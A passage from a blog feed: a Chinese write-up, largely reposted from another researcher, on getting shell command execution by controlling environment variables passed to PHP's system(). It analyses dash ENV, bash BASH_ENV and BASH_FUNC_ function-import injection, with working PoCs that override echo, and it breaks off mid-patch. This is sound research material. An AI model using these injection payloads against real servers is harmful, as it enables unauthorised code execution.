a14188f2b5aa2534417b25e606456bd8b1dbf1b2a75f546c0df81d065e05719d863fcbf64c6eba638b169221944237f7a9349811b243af015debd11b420479146b44e29b04faba578eb89556bf6dfd708c958d665719e43e1b728d93df04ea0c09aa90b35895c7c3133d47fe65b1b86760fa71c6090a034f109c3f477a618c248e744b99f05d9892353c098321b74b1b04fb1893f49128a5f1c96514cd12e743b7327001267d458faecb7e0c3563270f3a98cf4759290e336bc655bb30ba80a361ddc3872128efb973bb46db0a301ed65e6939ff1419c6f8265ff13604f7cee0f76ff38cd903c5856dd24876e5a8aa05b7f6fc1e8051dc559bd02f1e193f3fb1c551875df7df6498996aeb194a42947bdf917a5c2a23e58f2992ca7d1437f42566b163ec3bef93fbc4f7fea46c5e8639f2e18031b75d0a405ae8e400a67d94f92bd714ad5c1fe700c24884900b4fb26b018bae90333ae49c04792ede789138eb46fd28b0ea74feb730bb498f8bba231949751fa49677d5574659814fe80befecf00a2ca54712a943458035b6f9f7dec77b2a265d4b849c5fa5aebbbe4675d97cc1bc759a6dba7d0c305c2032e27e7ddd90f2207f9efe6c35b44684d68e330489a00fb9061ae43217d11b1fe97b11df0ccaca277259210005d06c3dfb8e5f2bd3810b1e0e5d09c096213a81d8826bc6863d341ffd3745b8684554e9ccb890fd24e5f37657b8293c3ffdfa18e99fbdb971cf48945d46b38aed39b028153e0069fa071a1ba5e2b218f7ad694f074e65f86be8db7b1290eefda85a6498ab62c6e3c7ac5cbb6289f7223cd40e89deeb1e65cd5afb7bfd490018cc9eff66962c4f9dbf80aa34be0cf6d278fc6f3a8e6c88a726cc415d45fca97a3410853ec2e637b57bb1fd039cd9a53dfe085cc13bd3a180e28cb7474154c5dd2d05cf55df44a54a7a5bb0435d955c477c932902592c7cca23bb86ead7902c798df67737020a8e0a1831d3fb91ba35f9d6c0801f3fd63fd5c9cbddf339149f3d1ed2a7efdd4ab231cf19250579d5c1cdf86b73f2cac9f79cd44655abed639f0200413be4d496ca8ac303fe4833511e938492d259569e05a2efdee516fa42ae33787c1b077eb9795ff96164aa4b766407750a38b3c6c9ff6ab859248d7bc8f4b91dde55497c72dd67d2c33e164f2395473106c1a8218919d1f87930862e33496afa5e2ca69dc48c735f20ed6991d2a167c02fe5bc90cd8c77db9c51fc663b960c4f792fa2750a096e2001adafcbd6423d4023617bb5fdb534d901050712c40603ebf20a0ea97</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">chat nc 43.96.147.93</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>chats</category>
      
    </categories>
    
    
    <tags>
      
      <tag>AFL</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>环境变量的一些奇特利用</title>
    <link href="/2022/12/12/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E7%9A%84%E4%B8%80%E4%BA%9B%E5%A5%87%E7%89%B9%E5%88%A9%E7%94%A8/"/>
    <url>/2022/12/12/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E7%9A%84%E4%B8%80%E4%BA%9B%E5%A5%87%E7%89%B9%E5%88%A9%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p>记录这篇文章的起因就是在NCTF中看到一个题，挺有意思的，然后看了题解，提到了P神的环境变量注入，想起来文章我看过，但是内容忘记了，于是打算重新学习一下。</p><blockquote><p>本文大部分内容都来自P神博客，基本上都是抄写了该文章的一些内容，算一篇转载—&gt; <a href="https://www.leavesongs.com/PENETRATION/how-I-hack-bash-through-environment-injection.html">https://www.leavesongs.com/PENETRATION/how-I-hack-bash-through-environment-injection.html</a></p></blockquote><p>文章中提到的内容主要是围绕以下代码:</p><figure><div class="code-wrapper"><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'envs'</span><span class="token punctuation">]</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=></span> <span class="token variable">$val</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token function">putenv</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$key</span><span class="token punctuation">&#125;</span></span>=<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$val</span><span class="token punctuation">&#125;</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token comment">//... 一些其他代码 </span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'echo hello'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>利用上段代码，如何getshell？看起来似乎是一件不可能的事情，但是实际上对环境变量的操作远远不止我们所理解的那么简单。</p><h1>0x01 问题分析</h1><p>环境变量基本的利用有一种，如果有上传文件的权限，那么就很自然的想到<code>LD_PRELOAD</code>，上传一个文件名不限的so文件，如<code>1.jpg</code>，然后通过设置动态链接库<code>LD_PRELOAD=/var/www/html/uploads/1.jpg</code>，劫持并执行任意代码。<br>但是在上面的代码中没有上传的地方，需要探索这个模式能不能getshell，则应该分析更底层的行为，php中system函数如下：</p><figure><div class="code-wrapper"><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">#define VCWD_POPEN(command, type) popen(command, type) // ...</span><span class="token constant">PHPAPI</span> <span class="token keyword type-declaration">int</span> <span class="token function">php_exec</span><span class="token punctuation">(</span><span class="token keyword type-declaration">int</span> type<span class="token punctuation">,</span> char <span class="token operator">*</span>cmd<span class="token punctuation">,</span> zval <span class="token operator">*</span><span class="token keyword type-declaration">array</span><span class="token punctuation">,</span> zval <span class="token operator">*</span>return_value<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token constant">FILE</span> <span class="token operator">*</span>fp<span class="token punctuation">;</span> <span class="token comment">// ... </span><span class="token comment">#ifdef PHP_WIN32 </span>fp <span class="token operator">=</span> <span class="token function">VCWD_POPEN</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> <span class="token string double-quoted-string">"rb"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">#else </span>fp <span class="token operator">=</span> <span class="token function">VCWD_POPEN</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> <span class="token string double-quoted-string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">#endif </span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>fp<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token function">php_error_docref</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">E_WARNING</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"Unable to fork [%s]"</span><span class="token punctuation">,</span> cmd<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">goto</span> err<span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token comment">// ...</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>可以看到php最终调用的是popen函数，popen函数是glibc提供的一个函数，查看其源码可以知道其最终调用如下：</p><figure><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> bool<span class="token function">spawn_process</span> <span class="token punctuation">(</span><span class="token class-name">posix_spawn_file_actions_t</span> <span class="token operator">*</span>fa<span class="token punctuation">,</span> FILE <span class="token operator">*</span>fp<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>command<span class="token punctuation">,</span>           <span class="token keyword">int</span> do_cloexec<span class="token punctuation">,</span> <span class="token keyword">int</span> pipe_fds<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">int</span> parent_end<span class="token punctuation">,</span> <span class="token keyword">int</span> child_end<span class="token punctuation">,</span>           <span class="token keyword">int</span> child_pipe_fd<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token comment">//...</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__posix_spawn</span> <span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_IO_proc_file <span class="token operator">*</span><span class="token punctuation">)</span> fp<span class="token punctuation">)</span><span class="token operator">-></span>pid<span class="token punctuation">,</span> _PATH_BSHELL<span class="token punctuation">,</span> fa<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>             <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token keyword">const</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token string">"sh"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token string">"-c"</span><span class="token punctuation">,</span>             <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span> command<span class="token punctuation">,</span> <span class="token constant">NULL</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> __environ<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> false<span class="token punctuation">;</span>  <span class="token comment">//...</span>  <span class="token keyword">return</span> true<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>popen最终调用了<code>spawn_process</code>函数，然后其中最后执行的是<code>sh -c command</code>，如果说我输入了一个命令<code>echo hello</code>，那么最终调用的就是<code>sh -c &quot;echo hello&quot;</code>。</p><p>转换以下上述问题，就是可以控制<code>sh -c &quot;echo hello&quot;</code>的环境变量，是否能够get shell？</p><h1>0x02 对getshell的尝试</h1><p>以上的命令可以从两个方面去分析，sh和echo，sh作为软连接指向bash或者dash（ubuntu为dash，centos为bash），echo作为一个二进制文件也可以分析，主要是抓住二者对环境变量的处理。</p><h2 id="debian中的注入"><a class="header-anchor" href="#debian中的注入">¶</a>debian中的注入</h2><p>先说ubuntu系统，系统中分析echo的源码，和环境变量有关的操作只有以下一个地方。</p><figure><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c">bool allow_options <span class="token operator">=</span>  <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token function">getenv</span> <span class="token punctuation">(</span><span class="token string">"POSIXLY_CORRECT"</span><span class="token punctuation">)</span>   <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token operator">!</span> DEFAULT_ECHO_TO_XPG <span class="token operator">&amp;&amp;</span> <span class="token number">1</span> <span class="token operator">&lt;</span> argc <span class="token operator">&amp;&amp;</span> <span class="token function">STREQ</span> <span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"-n"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></div></figure><p>而且是一个bool判断，没什么利用价值，关注点来到了dash。</p><p>在dash的main函数中有一段代码：</p><figure><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>shinit <span class="token operator">=</span> <span class="token function">lookupvar</span><span class="token punctuation">(</span><span class="token string">"ENV"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token constant">NULL</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">*</span>shinit <span class="token operator">!=</span> <span class="token char">'\0'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">read_profile</span><span class="token punctuation">(</span>shinit<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></div></figure><p><code>looupvar</code>用于查找环境变量的值，这里相当于查找<code>ENV</code>这个环境变量然后传递给<code>read_profile</code>执行。继续跟进<code>read_profile</code>函数：</p><figure><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c">STATIC <span class="token keyword">void</span><span class="token function">read_profile</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>name<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    name <span class="token operator">=</span> <span class="token function">expandstr</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">setinputfile</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> INPUT_PUSH_FILE <span class="token operator">|</span> INPUT_NOFILE_OK<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token function">cmdloop</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">popfile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>函数本意是读取shell中的profile文件，类似于<code>$HOME/.profile</code>，但是可以看到，第一句话就对name做了一次<code>expandstr</code>操作，即为解析操作，解析的目的是为了支持shell语法，比如说把<code>$HOME</code>解析成绝对路径，既然有解析那么就可能有命令执行。</p><p>尝试了如下poc</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">ENV</span><span class="token operator">=</span><span class="token string">'$(id 1>&amp;2)'</span> dash -c <span class="token string">'echo hello'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><p>但是发现没有回显，执行命令失败，进一步分析之后，发现一个问题：<br><img src="https://www.leavesongs.com/media/attachment/2022/02/21/7d54a730-6176-45b1-a998-ee1da4739096.png" alt=""><br>在进入目标语句之前有一个iflag变量，必须要这个变量满足，才可以进入到目标语句，而满足的条件是dash的参数有<code>-i</code>，再尝试以下poc：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">ENV</span><span class="token operator">=</span><span class="token string">'$(id 1>&amp;2)'</span> dash -i -c <span class="token string">'echo hello'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><p>成功执行<br><img src="https://www.leavesongs.com/media/attachment/2022/02/21/de438649-abc0-4f8d-9b0c-b71cb0dd83c1.png" alt=""></p><p>但是遗憾的是题目给出的条件是-c，并没有-i选项，所以这里的注入再限制条件中执行不了。<br>最后发现<code>PS1</code>、<code>PS2</code>、<code>PS4</code>这三个环境变量也是会被<code>expandstr</code>函数解析的，但是才疏学浅地我研究了一晚上PS4，发现它只能解析变量，无法执行命令，但我并没有弄明白原因：</p><p><a href="https://www.leavesongs.com/media/attachment/2022/02/21/fdeb6053-22be-47e3-9025-0b0c51425c1d.png"><img src="https://www.leavesongs.com/media/attachment/2022/02/21/fdeb6053-22be-47e3-9025-0b0c51425c1d.a6e46564087f.png" alt="image.png"></a></p><p>PS1是很好触发的，但需要进入交互式shell中方可执行：</p><p><img src="https://www.leavesongs.com/media/attachment/2022/02/21/1a3efd03-61cd-46c7-9a1b-636c40a9e5f8.27f2040d4bf3.png" alt="image.png"></p><h2 id="centos中的BASH-ENV"><a class="header-anchor" href="#centos中的BASH-ENV">¶</a>centos中的BASH_ENV</h2><p>和之前的debian类似，很快就找到了一个BASH_ENV环境变量：</p><figure><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">/* A non-interactive shell not named `sh' and not in posix mode reads and     executes commands from $BASH_ENV.  If `su' starts a shell with `-c cmd'     and `-su' as the name of the shell, we want to read the startup files.     No other non-interactive shells read any startup files. */</span><span class="token keyword">if</span> <span class="token punctuation">(</span>interactive_shell <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token punctuation">(</span>su_shell <span class="token operator">&amp;&amp;</span> login_shell<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>posixly_correct <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> act_like_sh <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> privileged_mode <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span>        sourced_env<span class="token operator">++</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>        <span class="token function">execute_env_file</span> <span class="token punctuation">(</span><span class="token function">get_string_value</span> <span class="token punctuation">(</span><span class="token string">"BASH_ENV"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>然后传入一个类似的poc：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">BASH_ENV</span><span class="token operator">=</span><span class="token string">'$(id 1>&amp;2)'</span> <span class="token function">bash</span> -c <span class="token string">'echo hello'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><p>直接执行成功<br><img src="https://www.leavesongs.com/media/attachment/2022/02/21/53c5feca-33b8-49e7-87ee-6be315f3d5ee.png" alt=""><br>但是遗憾的发现，sh注入失败，即</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">BASH_ENV</span><span class="token operator">=</span><span class="token string">'$(id 1>&amp;2)'</span> <span class="token function">sh</span> -c <span class="token string">'echo hello'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><p>执行失败，有点玄学，然后p神解释了原因，动态调试后可以发现有一个神奇的变量，<code>act_like_sh</code>，这个变量设置为1，导致以上语句没有执行。<br>当shell名字<code>shell_name</code>这个变量等于<code>sh</code>的时候，<code>act_like_sh</code>会变成1。这也就解释了我们前面反常的结果——为什么<code>bash -c</code>可以注入命令但<code>sh -c</code>不可以。</p><p>虽然但是，依然不能够解决最初的问题，在只控制环境变量的条件下拿到shell，但是一些有趣的注入可以记录一下，<strong>dash可以的注入方式，bash都可以</strong>，此外bash还有一个有趣的环境变量：PROMPT_COMMAND，如果有这个环境变量，那么在最后进行交互模式之前，会先执行这个命令，但是如果有了-c参数，则这个指令会被忽略。<br><code>PROMPT_COMMAND='id' bash</code></p><h2 id="最终的注入"><a class="header-anchor" href="#最终的注入">¶</a>最终的注入</h2><p>最终在centos上，还是解决了最开始提出的问题。<br><a href="https://www.leavesongs.com/PENETRATION/how-I-hack-bash-through-environment-injection.html#0x06-bash_env">https://www.leavesongs.com/PENETRATION/how-I-hack-bash-through-environment-injection.html#0x06-bash_env</a><br>懒得写了，可以看博客，非常清楚。<br>variables.c的<code>initialize_shell_variables</code>函数用于将环境变量注册成SHELL的变量，其中包含的一段代码引起了我的注意：</p><figure><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">for</span> <span class="token punctuation">(</span>string_index <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> env <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>string <span class="token operator">=</span> env<span class="token punctuation">[</span>string_index<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    name <span class="token operator">=</span> string<span class="token punctuation">;</span>    <span class="token comment">// ...</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>privmode <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> read_but_dont_execute <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span>         <span class="token function">STREQN</span> <span class="token punctuation">(</span>BASHFUNC_PREFIX<span class="token punctuation">,</span> name<span class="token punctuation">,</span> BASHFUNC_PREFLEN<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>        <span class="token function">STREQ</span> <span class="token punctuation">(</span>BASHFUNC_SUFFIX<span class="token punctuation">,</span> name <span class="token operator">+</span> char_index <span class="token operator">-</span> BASHFUNC_SUFFLEN<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>        <span class="token function">STREQN</span> <span class="token punctuation">(</span><span class="token string">"() &#123;"</span><span class="token punctuation">,</span> string<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token class-name">size_t</span> namelen<span class="token punctuation">;</span>        <span class="token keyword">char</span> <span class="token operator">*</span>tname<span class="token punctuation">;</span>        <span class="token comment">/* desired imported function name */</span>        namelen <span class="token operator">=</span> char_index <span class="token operator">-</span> BASHFUNC_PREFLEN <span class="token operator">-</span> BASHFUNC_SUFFLEN<span class="token punctuation">;</span>        tname <span class="token operator">=</span> name <span class="token operator">+</span> BASHFUNC_PREFLEN<span class="token punctuation">;</span>    <span class="token comment">/* start of func name */</span>        tname<span class="token punctuation">[</span>namelen<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token char">'\0'</span><span class="token punctuation">;</span>      <span class="token comment">/* now tname == func name */</span>        string_length <span class="token operator">=</span> <span class="token function">strlen</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token punctuation">;</span>        temp_string <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">xmalloc</span> <span class="token punctuation">(</span>namelen <span class="token operator">+</span> string_length <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">memcpy</span> <span class="token punctuation">(</span>temp_string<span class="token punctuation">,</span> tname<span class="token punctuation">,</span> namelen<span class="token punctuation">)</span><span class="token punctuation">;</span>        temp_string<span class="token punctuation">[</span>namelen<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token char">' '</span><span class="token punctuation">;</span>        <span class="token function">memcpy</span> <span class="token punctuation">(</span>temp_string <span class="token operator">+</span> namelen <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> string<span class="token punctuation">,</span> string_length <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">/* Don't import function names that are invalid identifiers from the         environment in posix mode, though we still allow them to be defined as         shell variables. */</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">absolute_program</span> <span class="token punctuation">(</span>tname<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>posixly_correct <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">||</span> <span class="token function">legal_identifier</span> <span class="token punctuation">(</span>tname<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token function">parse_and_execute</span> <span class="token punctuation">(</span>temp_string<span class="token punctuation">,</span> tname<span class="token punctuation">,</span> SEVAL_NONINT<span class="token operator">|</span>SEVAL_NOHIST<span class="token operator">|</span>SEVAL_FUNCDEF<span class="token operator">|</span>SEVAL_ONECMD<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">else</span>            <span class="token function">free</span> <span class="token punctuation">(</span>temp_string<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment">/* parse_and_execute does this */</span>        <span class="token comment">//...</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>这里for遍历了所有环境变量，并用 = 分割，<code>name</code>是环境变量，<code>string</code>是值。<br>当满足下面这些条件的情况下，<code>temp_string</code>将被传入<code>parse_and_execute</code>执行：</p><ul><li><code>privmode == 0</code>，即不能传入<code>-p</code>参数</li><li><code>read_but_dont_execute == 0</code>，即不能传入<code>-n</code>参数</li><li><code>STREQN (BASHFUNC_PREFIX, name, BASHFUNC_PREFLEN)</code>，环境变量名前10个字符等于<code>BASH_FUNC_</code></li><li><code>STREQ (BASHFUNC_SUFFIX, name + char_index - BASHFUNC_SUFFLEN)</code>，环境变量名后两个字符等于<code>%%</code></li><li><code>STREQN (&quot;() &#123;&quot;, string, 4)</code>，环境变量的值前4个字符等于<code>() &#123;</code></li></ul><p>前两个条件肯定是满足的，后三个条件是用户可控的，所以这个if语句是肯定可以进入的。进入if语句后，去除前缀<code>BASH_FUNC_</code>和后缀<code>%%</code>的部分将是一个变量名，而由<code>() &#123;</code>开头的字符串将会被执行。</p><p>这里其实做的就是一件事：<strong>根据环境变量的值初始化一个匿名函数，并赋予其名字</strong>。</p><p>所以，我们传入下面这样一个环境变量，将会在Bash上下文中添加一个myfunc函数：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">env</span> <span class="token string">$'BASH_FUNC_myfunc%%=() &#123; id; &#125;'</span> <span class="token function">bash</span> -c <span class="token string">'myfunc'</span>`<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><p><a href="https://www.leavesongs.com/media/attachment/2022/02/21/0619bb4a-7419-4cc4-9527-1435bbb3636b.png"><img src="https://www.leavesongs.com/media/attachment/2022/02/21/0619bb4a-7419-4cc4-9527-1435bbb3636b.00fa91df112a.png" alt="image.png"></a></p><p>这里仍然存在一个问题是，因为在执行<code>parse_and_execute</code>的时候配置了<code>SEVAL_FUNCDEF</code>，我们只能利用这个方法定义函数，而无法逃逸出函数执行任意命令。解决这个问题的方法也很简单，我们只需要覆盖一些已有的“命令”，在后面执行这个命令的时候就可以执行到我们定义的函数里了。</p><p>那么，回到本文开头说的那个问题，我添加了一个名为<code>echo</code>的函数，这样在执行<code>echo hello</code>的时候实际上执行的是我添加的函数：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">env</span> <span class="token string">$'BASH_FUNC_echo%%=() &#123; id; &#125;'</span> <span class="token function">bash</span> -c <span class="token string">'echo hello'</span>`<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><p><a href="https://www.leavesongs.com/media/attachment/2022/02/21/37d67a06-6efd-4758-878e-e69eecc526b4.png"><img src="https://www.leavesongs.com/media/attachment/2022/02/21/37d67a06-6efd-4758-878e-e69eecc526b4.0e974983ad60.png" alt="image.png"></a></p><p>几乎成功解决了这个问题。</p><h3 id="解决小瑕疵"><a class="header-anchor" href="#解决小瑕疵">¶</a>解决小瑕疵</h3><p>但是以上注入的办法是在<code>bash4.4</code>之后才可以执行，因为<code>BASH_FUNC_</code>这个Trick是在4.4以后才有的，所以低版本也要想一个利用办法。</p><p>这次发现的这个POC和ShellShock的POC很相似，原因就是，这个<code>BASH_FUNC</code>的环境变量，就是因为修复ShellShock而引入的。所以突破点实际上也可以从这里出发。</p><p>在ShellShock刚出现的时候，Bash的最新版本是4.3，这也是为什么Bash 4.4的时候引入了<code>BASH_FUNC</code>。但是，这不代表4.4以下的Bash就没有修复ShellShock漏洞，那么，他们是怎么修复的呢？</p><p>经过研究发现，CentOS 7这类操作系统虽然修复了ShellShock漏洞，但是并不是通过升级Bash版本来修复的，而是通过“打补丁”。</p><p>我们来看看redhat对于Bash 4.2的补丁：<a href="https://bugzilla-attachments.redhat.com/attachment.cgi?id=941826">https://bugzilla-attachments.redhat.com/attachment.cgi?id=941826</a></p><figure><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token operator">--</span><span class="token operator">-</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span>bash<span class="token operator">-</span><span class="token number">4.2</span><span class="token operator">-</span>orig<span class="token operator">/</span>variables<span class="token punctuation">.</span>c    <span class="token number">2014</span><span class="token operator">-</span><span class="token number">09</span><span class="token operator">-</span><span class="token number">25</span> <span class="token number">13</span><span class="token operator">:</span><span class="token number">07</span><span class="token operator">:</span><span class="token number">59.313209541</span> <span 